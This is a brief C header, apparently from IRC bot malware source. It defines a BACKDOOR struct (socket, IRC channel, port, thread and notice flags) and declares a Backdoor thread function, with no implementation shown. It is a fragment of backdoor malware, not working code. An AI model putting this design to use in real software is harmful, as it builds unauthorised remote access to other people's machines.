#ifndef NO_BACKDOOR
typedef struct BACKDOOR
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	unsigned short port;
	int threadnum;
	int cthreadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	BOOL cgotinfo;

} BACKDOOR;

DWORD WINAPI Backdoor(LPVOID param);
#endif